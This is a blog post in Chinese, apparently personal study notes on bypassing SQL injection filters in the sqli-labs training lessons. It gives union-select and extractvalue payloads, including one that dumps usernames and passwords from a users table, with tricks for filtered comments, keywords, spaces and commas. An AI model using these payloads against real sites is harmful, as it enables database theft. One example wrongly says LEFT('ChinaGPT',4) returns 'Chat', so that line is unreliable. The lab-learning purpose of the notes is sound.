@@ -1,0 +1,186 @@
+<!DOCTYPE html><html lang="en" theme-mode="light"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Sql注入学习笔记#12 | Vincent</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":"all","activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Brands';
+ src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Free';
+ src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://cdnjson.com/images/2023/05/14/bg.jpg');
+  --light-background: url('https://cdnjson.com/images/2023/05/14/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>Sql注入学习笔记#12</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-06-08T07:31:55.000Z" id="date"> 2023-06-08</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-06-19T03:00:20.517Z" id="updated"> 2023-06-19</time></div></span></div></div><hr><div id="post-content"><p>这篇文章讲解各种过滤的绕过方式，</p>
+<p>例如 注释符 and or 逗号等过滤</p>
+<span id="more"></span>
+
+<h1 id="1-注释符过滤绕过"><a href="#1-注释符过滤绕过" class="headerlink" title="1 注释符过滤绕过"></a>1 注释符过滤绕过</h1><p>打开sql-labs的23课，</p>
+<p>发现这是一个非常简单的字符型注入，</p>
+<p>但是你会发现这里注释符被过滤了，</p>
+<p>我首先尝试使用编码漏洞，将#编码成%23，</p>
+<p>但是依旧被过滤了</p>
+<p>既然不能注释后面的内容，那就让后面的内容失效！</p>
+<p>构造如下语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() and &#x27;1&#x27;=&#x27;1<br></code></pre></td></tr></table></figure>
+
+<p>加上前面后面的语句，就变成了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27;select * from users where id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() and &#x27;1&#x27;=&#x27;1&#x27; limit 0,1<br></code></pre></td></tr></table></figure>
+
+<h1 id="2-and-or-过滤绕过"><a href="#2-and-or-过滤绕过" class="headerlink" title="2 and or 过滤绕过"></a>2 and or 过滤绕过</h1><ol>
+<li><p>大小写绕过</p>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1 anD 1=1 order by n<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>复写过滤字符</p>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1 aandnd 1=1 order by n<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>用&amp;&amp;代替and 用||代替or</p>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1 &amp;&amp; 1=1 order by n <br></code></pre></td></tr></table></figure>
+</li>
+<li><p>url编码</p>
+<p>例如将&amp;&amp;编码为%26</p>
+</li>
+</ol>
+<p>当然还有很多</p>
+
+
+<h2 id="2-1-实战less25"><a href="#2-1-实战less25" class="headerlink" title="2.1 实战less25"></a>2.1 实战less25</h2><p>这里直接实战一下吧好久没有不看课打靶了</p>
+<p>首先判断字段数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; order by 3--+<br></code></pre></td></tr></table></figure>
+
+<p>发现order被过滤成了der，</p>
+<p>说明or关键字被过滤</p>
+<p>这里复写过滤字符绕过了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; oorrder by 3--+<br></code></pre></td></tr></table></figure>
+
+<p>判断出字段数是3</p>
+<p>接下来构造语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=-1&#x27; union select 1,2,3--+<br></code></pre></td></tr></table></figure>
+
+<p>发现回显位是2,3</p>
+<p>开始注入，这里知道了表名和列名直接最后一步吧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=-1&#x27; union select 1,2,group_concat(id,username,passwoorrd) from users--+<br></code></pre></td></tr></table></figure>
+
+<p>因为or被过滤了所以password要写成passwoorrd</p>
+<p>结束</p>
+<h1 id="3-空格过滤绕过"><a href="#3-空格过滤绕过" class="headerlink" title="3 空格过滤绕过"></a>3 空格过滤绕过</h1><ol>
+<li><p>url编码绕过</p>
+<p>这里的url编码可以使用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">%20, %09, %0a, %0b, %0c, %0d, %a0<br></code></pre></td></tr></table></figure>
+
+<p>less26发现没有一个是可以用的</p>
+</li>
+<li><p>不出现空格</p>
+<p>使用||可以有效避免这个问题</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=-1&#x27;||extractvalue(1,concat(0x7e,(你的语句)))||&#x27;1&#x27;=&#x27;1<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>使用+代替空格</p>
+</li>
+</ol>
+<h1 id="4-limit过滤绕过"><a href="#4-limit过滤绕过" class="headerlink" title="4 limit过滤绕过"></a>4 limit过滤绕过</h1><p>limit用不了可以使用substring()函数，</p>
+<p>如果substring()函数也被过滤了，</p>
+<p>可以使用mid()函数替换，与substring函数用法完全相同，</p>
+<p>语句完全兼容，</p>
+<p>在如果连这两个函数都被过滤了，可以使用left函数，</p>
+<p>他的用法几乎和这两个函数一样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">mysql&gt; select left(&#x27;vincent&#x27;,2);<br>+-------------------+<br>| left(&#x27;vincent&#x27;,2) |<br>+-------------------+<br>| vi                |<br>+-------------------+<br></code></pre></td></tr></table></figure>
+
+<p>MySQL中的LEFT()函数是一个字符串函数，它返回字符串左边的指定字符数。该函数接受两个参数，第一个参数为指定字符串，第二个参数为要返回的字符数。</p>
+<p>语法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">LEFT(string, length)<br></code></pre></td></tr></table></figure>
+
+<p>其中，</p>
+<ul>
+<li>string：必需，要截取左侧部分的字符串；</li>
+<li>length：必需，要返回的长度，是一个非负整数。</li>
+</ul>
+<p>示例：</p>
+<p>假设有一个表t1，其中有一个字段name，值为“ChinaGPT”。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT LEFT(name, 4) AS shortened_name FROM t1;<br></code></pre></td></tr></table></figure>
+
+<p>查询结果将会是“Chat”。</p>
+<p>注意：如果给出的length大于string的长度，则返回整个字符串。如果给出的length为0或负数，则返回空字符串。</p>
+<h1 id="5-逗号绕过"><a href="#5-逗号绕过" class="headerlink" title="5 逗号绕过"></a>5 逗号绕过</h1><ol>
+<li><p>老一套的url编码大概率不行</p>
+</li>
+<li><p>join绕过</p>
+<p>问了一下chatgpt：</p>
+<p>在SQL中，JOIN是用于将两个或多个表格基于它们之间的关联字段进行连接的操作。JOIN操作允许从多个表格中检索相关数据，并将其组合成一个结果集。以下是几种常见的JOIN类型及其用法：</p>
+<ol>
+<li><p>内连接（INNER JOIN）： 内连接返回两个表中满足连接条件的行。语法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT 列名<br>FROM 表1<br>INNER JOIN 表2<br>ON 表1.关联字段 = 表2.关联字段;<br></code></pre></td></tr></table></figure>
+
+<p>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT Orders.OrderID, Customers.CustomerName<br>FROM Orders<br>INNER JOIN Customers<br>ON Orders.CustomerID = Customers.CustomerID;<br></code></pre></td></tr></table></figure>
+
+<p>这个查询将返回满足关联条件的Orders表和Customers表中的行，包含OrderID和CustomerName列。</p>
+</li>
+<li><p>左连接（LEFT JOIN）： 左连接返回左表中的所有行，以及右表中满足连接条件的行。如果右表中没有匹配的行，则会返回NULL值。语法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT 列名<br>FROM 表1<br>LEFT JOIN 表2<br>ON 表1.关联字段 = 表2.关联字段;<br></code></pre></td></tr></table></figure>
+
+<p>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT Customers.CustomerName, Orders.OrderID<br>FROM Customers<br>LEFT JOIN Orders<br>ON Customers.CustomerID = Orders.CustomerID;<br></code></pre></td></tr></table></figure>
+
+<p>这个查询将返回Customers表中的所有行以及满足关联条件的Orders表中的行。如果没有匹配的订单，OrderID列将包含NULL值。</p>
+</li>
+<li><p>右连接（RIGHT JOIN）： 右连接返回右表中的所有行，以及左表中满足连接条件的行。如果左表中没有匹配的行，则会返回NULL值。语法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT 列名<br>FROM 表1<br>RIGHT JOIN 表2<br>ON 表1.关联字段 = 表2.关联字段;<br></code></pre></td></tr></table></figure>
+
+<p>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT Customers.CustomerName, Orders.OrderID<br>FROM Customers<br>RIGHT JOIN Orders<br>ON Customers.CustomerID = Orders.CustomerID;<br></code></pre></td></tr></table></figure>
+
+<p>这个查询将返回Orders表中的所有行以及满足关联条件的Customers表中的行。如果没有匹配的顾客，CustomerName列将包含NULL值。</p>
+</li>
+<li><p>全连接（FULL JOIN）： 全连接返回左表和右表中的所有行，如果没有匹配的行，则会返回NULL值。语法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT 列名<br>FROM 表1<br>FULL JOIN 表2<br>ON 表1.关联字段 = 表2.关联字段;<br></code></pre></td></tr></table></figure>
+
+<p>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT Customers.CustomerName, Orders.OrderID<br>FROM Customers<br>FULL JOIN Orders<br>ON Customers.CustomerID = Orders.CustomerID;<br></code></pre></td></tr></table></figure>
+
+<p>这个查询将返回Customers表和Orders表中的所有行，如果没有匹配的行，对应的列将包含NULL值。</p>
+</li>
+</ol>
+<p>这些是最常见的JOIN类型，可以根据数据之间的关系选择合适的JOIN操作来获取所需的结果。需要注意的是，在使用JOIN时，关联字段的值应该相互匹配，以确保正确的连接。</p>
+</li>
+</ol>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=-1&#x27; union select 1,2,3 --+<br></code></pre></td></tr></table></figure>
+
+<p>等价于：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=-1&#x27; union select * from (select 1)a join (select 2)b join (select 3)c --+<br></code></pre></td></tr></table></figure>
+
+<p>可以在回显位开始你的表演</p>
+<h1 id="6-最后"><a href="#6-最后" class="headerlink" title="6 最后"></a>6 最后</h1><p>找到一份比较好的绕过总结</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Likhaooo/article/details/122746954">SQL注入绕过技术总结</a></p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/06/09/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-13/">← Next Sql注入学习笔记#13</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/06/08/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-11/">Sql注入学习笔记#11 Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="valine-sel"></button></div><div id="valine"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="./img/logo.jpg" alt="Logo"></a><h1 id="Dr"><a href="/">Vincent</a></h1><div id="description"><p>不与无谓人争气</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E6%B3%A8%E9%87%8A%E7%AC%A6%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">1 注释符过滤绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-and-or-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">2 and or 过滤绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E5%AE%9E%E6%88%98less25"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 实战less25</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">3 空格过滤绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-limit%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">4 limit过滤绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-%E9%80%97%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">5.</span> <span class="toc-text">5 逗号绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-%E6%9C%80%E5%90%8E"><span class="toc-number">6.</span> <span class="toc-text">6 最后</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {new Valine({
+ el: '#valine'
+ , appId: 'HPascq2qxfVnEiu0BvuEltaD-gzGzoHsz'
+ , appKey: 'AKHEZyHQcEOLkAQk07kDBYgN' , placeholder: 'This comment is sent by Penguin Logistics.'
+ , path: window.location.pathname
+});code.findCode();
+document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
